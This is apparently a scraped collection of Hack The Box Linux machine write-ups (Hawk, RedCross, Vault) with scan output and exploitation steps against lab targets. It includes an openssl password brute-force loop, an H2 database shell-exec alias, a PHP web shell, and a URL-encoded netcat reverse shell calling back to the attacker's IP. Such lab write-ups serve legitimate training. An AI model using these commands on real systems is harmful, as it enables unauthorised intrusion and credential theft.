SF:e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0e\\0t\\0\\(\\ SF:0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x001\\x005\\x005\\0\\)\\ SF:0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002\\0\\.\\0m\\0e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0 SF:D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0e\\0t\\0\\(\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0 SF:t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x001\\x004\\x004\\0\\)\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o SF:\\0r\u0026#34;)%r(Kerberos,45E,\u0026#34;\\0\\0\\0\\0\\0\\0\\0\\x05\\x009\\x000\\x001\\x001\\x007\\0\\0\\0 SF:F\\0R\\0e\\0m\\0o\\0t\\0e\\0\\x20\\0c\\0o\\0n\\0n\\0e\\0c\\0t\\0i\\0o\\0n\\0s\\0\\x20\\0t\\0o\\ SF:0\\x20\\0t\\0h\\0i\\0s\\0\\x20\\0s\\0e\\0r\\0v\\0e\\0r\\0\\x20\\0a\\0r\\0e\\0\\x20\\0n\\0o\\0t SF:\\0\\x20\\0a\\0l\\0l\\0o\\0w\\0e\\0d\\0,\\0\\x20\\0s\\0e\\0e\\0\\x20\\0-\\0t\\0c\\0p\\0A\\0l\\0 SF:l\\0o\\0w\\0O\\0t\\0h\\0e\\0r\\0s\\xff\\xff\\xff\\xff\\0\\x01`\\x05\\0\\0\\x01\\xd8\\0o\\0r\\ SF:0g\\0\\.\\0h\\x002\\0\\.\\0j\\0d\\0b\\0c\\0\\.\\0J\\0d\\0b\\0c\\0S\\0Q\\0L\\0E\\0x\\0c\\0e\\0p\\ SF:0t\\0i\\0o\\0n\\0:\\0\\x20\\0R\\0e\\0m\\0o\\0t\\0e\\0\\x20\\0c\\0o\\0n\\0n\\0e\\0c\\0t\\0i\\0o SF:\\0n\\0s\\0\\x20\\0t\\0o\\0\\x20\\0t\\0h\\0i\\0s\\0\\x20\\0s\\0e\\0r\\0v\\0e\\0r\\0\\x20\\0a\\0 SF:r\\0e\\0\\x20\\0n\\0o\\0t\\0\\x20\\0a\\0l\\0l\\0o\\0w\\0e\\0d\\0,\\0\\x20\\0s\\0e\\0e\\0\\x20\\ SF:0-\\0t\\0c\\0p\\0A\\0l\\0l\\0o\\0w\\0O\\0t\\0h\\0e\\0r\\0s\\0\\x20\\0\\[\\x009\\x000\\x001\\x SF:001\\x007\\0-\\x001\\x009\\x006\\0\\]\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002 SF:\\0\\.\\0m\\0e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0 SF:e\\0t\\0J\\0d\\0b\\0c\\0S\\0Q\\0L\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\(\\0D\\0b\\0E\\0x\\0c SF:\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x003\\x004\\x005\\0\\)\\0\\n\\0\\t\\0a\\0t\\ SF:0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002\\0\\.\\0m\\0e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\ SF:0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0e\\0t\\0\\(\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\. SF:\\0j\\0a\\0v\\0a\\0:\\x001\\x007\\x009\\0\\)\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\ SF:x002\\0\\.\\0m\\0e\\0s\\0s\\0a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\ SF:0g\\0e\\0t\\0\\(\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x001\\x SF:005\\x005\\0\\)\\0\\n\\0\\t\\0a\\0t\\0\\x20\\0o\\0r\\0g\\0\\.\\0h\\x002\\0\\.\\0m\\0e\\0s\\0s\\0 SF:a\\0g\\0e\\0\\.\\0D\\0b\\0E\\0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0g\\0e\\0t\\0\\(\\0D\\0b\\0E\\ SF:0x\\0c\\0e\\0p\\0t\\0i\\0o\\0n\\0\\.\\0j\\0a\\0v\\0a\\0:\\x001\\x004\\x004\\0\\)\\0\\n\\0\\t\\0 SF:a\\0t\\0\\x20\\0o\\0r\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds Drupal gobuster └─$ gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt -k --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.102 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.txt (Status: 403) [Size: 291] /.php (Status: 403) [Size: 291] /search (Status: 403) [Size: 7398] /index.php (Status: 200) [Size: 7464] /misc (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.102/misc/] /0 (Status: 200) [Size: 7464] /user (Status: 200) [Size: 7297] /themes (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.102/themes/] /modules (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.102/modules/] /admin (Status: 403) [Size: 7551] /scripts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.102/scripts/] /node (Status: 200) [Size: 7464] /Search (Status: 403) [Size: 7398] /sites (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.102/sites/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.102/includes/] /install.php (Status: 200) [Size: 3172] /profiles (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.102/profiles/] /update.php (Status: 403) [Size: 4060] /README (Status: 200) [Size: 5382] /README.txt (Status: 200) [Size: 5382] /robots (Status: 200) [Size: 2189] /robots.txt (Status: 200) [Size: 2189] /cron.php (Status: 403) [Size: 7406] /INSTALL (Status: 200) [Size: 17995] /INSTALL.txt (Status: 200) [Size: 17995] /LICENSE (Status: 200) [Size: 18092] /LICENSE.txt (Status: 200) [Size: 18092] /User (Status: 200) [Size: 8940] ftp └─$ ftp anonymous@10.10.10.102 Connected to 10.10.10.102. 220 (vsFTPd 3.0.3) 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||40172|) 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 messages 226 Directory send OK. ftp\u0026gt; cd messages 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||41614|) 150 Here comes the directory listing. 226 Directory send OK. ftp\u0026gt; ls -lha 229 Entering Extended Passive Mode (|||48301|) 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 . drwxr-xr-x 3 ftp ftp 4096 Jun 16 2018 .. -rw-r--r-- 1 ftp ftp 240 Jun 16 2018 .drupal.txt.enc 226 Directory send OK. ftp\u0026gt; more .drupal.txt.enc U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk= Port 8082 droopescan └─$ droopescan scan drupal -u http://10.10.10.102 [+] Plugins found: profile http://10.10.10.102/modules/profile/ php http://10.10.10.102/modules/php/ image http://10.10.10.102/modules/image/ [+] Themes found: seven http://10.10.10.102/themes/seven/ garland http://10.10.10.102/themes/garland/ [+] Possible version(s): 7.58 [+] Possible interesting urls found: Default changelog file - http://10.10.10.102/CHANGELOG.txt Default admin - http://10.10.10.102/user/login [+] Scan finished (0:03:49.891702 elapsed) Foothold File from ftp └─$ file drupal.txt.enc drupal.txt.enc: openssl enc\u0026#39;d data with salted password, base64 encoded Let\u0026rsquo;s decrypt We could use https://github.com/HrushikeshK/openssl-bruteforce or openssl by assuming that the most common encryption was used: AES-256-CBC └─$ cat /usr/share/wordlists/rockyou.txt | while read pass; do (openssl enc -d -a -AES-256-CBC -in drupal.txt.enc -k $pass \u0026gt; devnull 2\u0026gt;\u0026amp;1); if [[ $? -eq 0 ]]; then echo \u0026#34;Success: $pass\u0026#34;;break; fi; done; Success: friends └─$ openssl enc -d -a -AES-256-CBC -in drupal.txt.enc -k friends *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. Daniel, Following the password for the portal: PencilKeyboardScanner123 Please let us know when the portal is ready. Kind Regards, IT department Let\u0026rsquo;s login to drupal admin:PencilKeyboardScanner123 Let\u0026rsquo;s get reverse shell https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal#rce Click preview User We can check drupal settings Located in /var/www/html/sites/default/settings.php ... * @endcode */ $databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;drupal4hawk\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), ); /** ... su to daniel www-data@hawk:/var/www/html$ su daniel Password: Python 3.6.5 (default, Apr 1 2018, 05:46:30) [GCC 7.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; We can launch subprocess \u0026gt;\u0026gt;\u0026gt; import subprocess \u0026gt;\u0026gt;\u0026gt; subprocess.call(\u0026#39;/bin/bash\u0026#39;, shell=True) daniel@hawk:/var/www/html$ id uid=1002(daniel) gid=1005(daniel) groups=1005(daniel) daniel@hawk:/var/www/html$ Root Enumerate daniel@hawk:/var/www/html$ ps -aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.8 159552 8904 ? Ss 16:47 0:02 /sbin/init maybe-ubiquity ... root 749 0.0 0.0 4628 860 ? Ss 16:47 0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar root 750 0.1 5.1 2341724 52136 ? Sl 16:47 0:06 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar ... It\u0026rsquo;s probably H2 database wwe saww earlier on port 8082 ssh works, we can configure port forwarding └─$ ssh -L 8082:localhost:8082 daniel@10.10.10.102 Warning: Permanently added \u0026#39;10.10.10.102\u0026#39; (ED25519) to the list of known hosts. daniel@10.10.10.102\u0026#39;s password: Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Oct 22 18:19:40 UTC 2023 System load: 0.0 Processes: 179 Usage of /: 47.6% of 7.32GB Users logged in: 0 Memory usage: 49% IP address for eth0: 10.10.10.102 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 417 packages can be updated. 268 updates are security updates. Last login: Sun Jul 1 13:46:16 2018 from dead:beef:2::1004 Python 3.6.5 (default, Apr 1 2018, 05:46:30) [GCC 7.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import subprocess \u0026gt;\u0026gt;\u0026gt; subprocess.call(\u0026#39;/bin/bash\u0026#39;, shell=True) daniel@hawk:~$ We saw an error earlier on port 8082, now we can access it via localhost:8082 I can\u0026rsquo;t login using previous creds But we can use non-existent url to get access https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/h2-java-sql-database#access Now we can create alias https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026quot;\\\\A\u0026quot;); return s.hasNext() ? s.next() : \u0026quot;\u0026quot;; }$$; Now let\u0026rsquo;s get a root ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/hawk/images/hawk.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/hawk/","summary":"Hawk Enumeration nmap └─$ nmap -Pn -p- 10.10.10.102 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:48 BST Stats: 0:09:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 78.74% done; ETC: 18:00 (0:02:35 remaining) Nmap scan report for 10.10.10.102 (10.10.10.102) Host is up (0.15s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 5435/tcp open sceanics 8082/tcp open blackice-alerts 9092/tcp open XmlIpcRegSvc └─$ nmap -Pn -p21,22,80,5435,8082,9092 -sC -sV 10.","tags":["HTB","drupal","ftp","openssl","openssl-bruteforce","php","credentials","h2"],"title":"[HTB] Machine: Hawk"},{"categories":null,"contents":"RedCross Enumeration nmap └─$ nmap -Pn -p- 10.10.10.113 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:12 BST Nmap scan report for 10.10.10.113 (10.10.10.113) Host is up (0.12s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 36.85 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.10.113 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:13 BST Nmap scan report for 10.10.10.113 (10.10.10.113) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0) | ssh-hostkey: | 2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA) | 256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA) |_ 256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519) 80/tcp open http Apache httpd 2.4.25 |_http-title: Did not follow redirect to https://intra.redcross.htb/ |_http-server-header: Apache/2.4.25 (Debian) 443/tcp open ssl/http Apache httpd 2.4.25 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US | Not valid before: 2018-06-03T19:46:58 |_Not valid after: 2021-02-27T19:46:58 |_http-title: Did not follow redirect to https://intra.redcross.htb/ |_http-server-header: Apache/2.4.25 (Debian) Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/redcross/images/redcross.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/redcross/","summary":"RedCross Enumeration nmap └─$ nmap -Pn -p- 10.10.10.113 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:12 BST Nmap scan report for 10.10.10.113 (10.10.10.113) Host is up (0.12s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 36.85 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.10.113 --min-rate 5000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: RedCross"},{"categories":null,"contents":"Vault Enumeration nmap └─$ nmap -Pn -p- 10.10.10.109 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:19 BST Warning: 10.10.10.109 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.109 (10.10.10.109) Host is up (0.12s latency). Not shown: 56547 filtered tcp ports (no-response), 8986 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 133.42 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.109 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:21 BST Nmap scan report for 10.10.10.109 (10.10.10.109) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA) | 256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA) |_ 256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.109 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 291] /index.php (Status: 200) [Size: 299] We saw an announcement about the first client: sparklays Let\u0026rsquo;s try feroxbuster that endpoint └─$ feroxbuster -u http://10.10.10.109/sparklays -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --depth 3 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.109/sparklays 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 3 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 11l 32w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 28w 316c http://10.10.10.109/sparklays =\u0026gt; http://10.10.10.109/sparklays/ 200 GET 3l 2w 16c http://10.10.10.109/sparklays/login.php 200 GET 13l 38w 615c http://10.10.10.109/sparklays/admin.php 301 GET 9l 28w 323c http://10.10.10.109/sparklays/design =\u0026gt; http://10.10.10.109/sparklays/design/ 301 GET 9l 28w 331c http://10.10.10.109/sparklays/design/uploads =\u0026gt; http://10.10.10.109/sparklays/design/uploads/ 200 GET 18l 43w 484c http://10.10.10.109/sparklays/design/changelogo.php 200 GET 3l 8w 72c http://10.10.10.109/sparklays/design/design.html Foothold Nothing interesting on http://10.10.10.109/sparklays/login.php and http://10.10.10.109/sparklays/admin.php But http://10.10.10.109/sparklays/design/design.html has upload page Let\u0026rsquo;s play around with it I tried uploading php file, looks like there\u0026rsquo;s a file type check We could try one of the following methods to bypass the check https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks Let\u0026rsquo;s start with changing extensions I will use Burp Intruder Wordlist Start the attack We have a few hits And we have our web shell └─$ curl -s \u0026#39;http://10.10.10.109/sparklays/design/uploads/shell.php5\u0026#39; -d \u0026#39;cmd=id\u0026#39; uid=33(www-data) gid=33(www-data) groups=33(www-data) Let\u0026rsquo;s get reverse shell https://www.revshells.com/ └─$ curl -s \u0026#39;http://10.10.10.109/sparklays/design/uploads/shell.php5\u0026#39; -d \u0026#39;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.9%206666%20%3E%2Ftmp%2Ff\u0026#39; └─$ nc -vlnp 6666 listening on [any] 6666 ... connect to [10.10.16.9] from (UNKNOWN) [10.10.10.109] 50608 bash: cannot set terminal process group (1383): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/sparklays/design/uploads$ User We have a 3 files inside dave\u0026rsquo;s desktop One contains potential creds www-data@ubuntu:/$ ls -lha /home/dave/Desktop/ total 20K drwxr-xr-x 2 dave dave 4.0K Jun 2 2021 . drwxr-xr-x 18 dave dave 4.0K Jun 2 2021 .. -rw-rw-r-- 1 alex alex 74 Jul 17 2018 Servers -rw-rw-r-- 1 alex alex 14 Jul 17 2018 key -rw-rw-r-- 1 alex alex 20 Jul 17 2018 ssh www-data@ubuntu:/$ ls -lha /home/dave/Desktop/ssh -rw-rw-r-- 1 alex alex 20 Jul 17 2018 /home/dave/Desktop/ssh www-data@ubuntu:/$ cat /home/dave/Desktop/ssh dave Dav3therav3123 www-data@ubuntu:/$ cat /home/dave/Desktop/key itscominghome www-data@ubuntu:/$ cat /home/dave/Desktop/Servers DNS + Configurator - 192.168.122.4 Firewall - 192.168.122.5 The Vault - x www-data@ubuntu:/$ We can su as dave or ssh www-data@ubuntu:/$ su - dave Password: dave@ubuntu:~$ └─$ sshpass -p \u0026#39;Dav3therav3123\u0026#39; ssh dave@10.10.10.109 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 222 packages can be updated. 47 updates are security updates. Last login: Sun Sep 2 07:17:32 2018 from 192.168.1.11 dave@ubuntu:~$ Root We saw a note with dns and firewall ip addresses Checking our network configs shows that we have additional interface within the same subnet dave@ubuntu:~$ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens192: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:ea:e6 brd ff:ff:ff:ff:ff:ff inet 10.10.10.109/24 brd 10.10.10.255 scope global ens192 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:eae6/64 scope global mngtmpaddr dynamic valid_lft 86399sec preferred_lft 14399sec inet6 fe80::250:56ff:feb9:eae6/64 scope link valid_lft forever preferred_lft forever 3: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0 valid_lft forever preferred_lft forever 4: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 52:54:00:ff:fd:68 brd ff:ff:ff:ff:ff:ff 5: vnet0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000 link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff inet6 fe80::fc54:ff:fe17:ab49/64 scope link valid_lft forever preferred_lft forever 6: vnet1: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000 link/ether fe:54:00:3a:3b:d5 brd ff:ff:ff:ff:ff:ff inet6 fe80::fc54:ff:fe3a:3bd5/64 scope link valid_lft forever preferred_lft forever 7: vnet2: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000 link/ether fe:54:00:e1:74:41 brd ff:ff:ff:ff:ff:ff inet6 fe80::fc54:ff:fee1:7441/64 scope link valid_lft forever preferred_lft forever 8: vnet3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000 link/ether fe:54:00:c6:70:66 brd ff:ff:ff:ff:ff:ff inet6 fe80::fc54:ff:fec6:7066/64 scope link valid_lft forever preferred_lft forever If we check ps -aux, we see qemu So we have 3 vms: dns, firewall and vault ... libvirt+ 1790 0.5 17.0 2120288 684444 ? Sl Oct24 6:02 qemu-system-x86_64 -enable-kvm -name DNS -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 4 root 1808 0.0 0.0 0 0 ? S Oct24 0:00 [kvm-pit/1790] libvirt+ 1955 0.5 15.1 2120616 607720 ? Sl Oct24 5:57 qemu-system-x86_64 -enable-kvm -name Firewall -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -u root 1973 0.0 0.0 0 0 ? S Oct24 0:00 [kvm-pit/1955] libvirt+ 2051 0.4 14.6 2120288 589444 ? Sl Oct24 5:35 qemu-system-x86_64 -enable-kvm -name Vault -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid root 2068 0.0 0.0 0 0 ? S Oct24 0:00 [kvm-pit/2051] ... We can perform ping sweep dave@ubuntu:~$ for i in {1..254}; do (ping -c 1 192.168.122.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done 64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.091 ms 64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=1.46 ms 64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=2.15 ms Let\u0026rsquo;s do port scan using nc dave@ubuntu:~$ nc -zv 192.168.122.4 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused Connection to 192.168.122.4 22 port [tcp/ssh] succeeded! Connection to 192.168.122.4 80 port [tcp/http] succeeded! dave@ubuntu:~$ nc -zv 192.168.122.5 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused 2 port open on DNS, while nothing on firewall I\u0026rsquo;ll enable dynamic port forwarding └─$ sshpass -p \u0026#39;Dav3therav3123\u0026#39; ssh dave@10.10.10.109 -D 9001 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 222 packages can be updated. 47 updates are security updates. Last login: Wed Oct 25 07:23:08 2023 from 10.10.16.9 dave@ubuntu:~$ Let\u0026rsquo;s open http://192.168.122.4/ Set SOCKS proxy in Burp First link http://192.168.122.4/dns-config.php doesn\u0026rsquo;t work But http://192.168.122.4/vpnconfig.php works Clicking Test VPN results in success There is a RCE via OpenVPN config 